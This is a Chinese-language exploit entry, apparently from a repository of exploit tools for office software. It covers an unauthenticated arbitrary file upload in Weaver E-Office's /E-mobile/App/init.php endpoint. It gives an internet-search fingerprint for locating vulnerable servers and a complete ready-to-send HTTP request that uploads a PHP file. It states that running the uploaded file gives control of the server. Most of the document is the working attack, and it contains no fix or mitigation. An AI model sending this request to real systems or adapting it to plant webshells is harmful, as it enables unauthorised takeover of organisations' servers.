---
source: "LittleBear4/OA-EXPTOOL"
---

# 泛微E-Office FlowCommon.php 文件上传漏洞

## 漏洞描述

泛微 E-Office 的 `/E-mobile/App/init.php` 接口存在任意文件上传漏洞。通过指定 `m=common_Common_Flow`、`f=flowDo`、`diff=feedback` 参数调用流程附件上传功能，`file_name` 参数可控且未做有效校验，攻击者无需登录即可上传任意文件到服务器，直接获取 Webshell。

## 漏洞影响

```
泛微 E-Office
```

## 网络测绘

```
app="泛微-EOffice"
```

## 漏洞复现

```http
POST /E-mobile/App/init.php?m=common_Common_Flow&f=flowDo&diff=feedback HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file_name"
test123.php
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test123.php"
Content-Type: application/octet-stream

<?php phpinfo();?>
------WebKitFormBoundary--
```

上传成功后，文件保存在服务器可访问目录，直接访问对应路径即可执行上传的 PHP 文件，获取服务器控制权限。
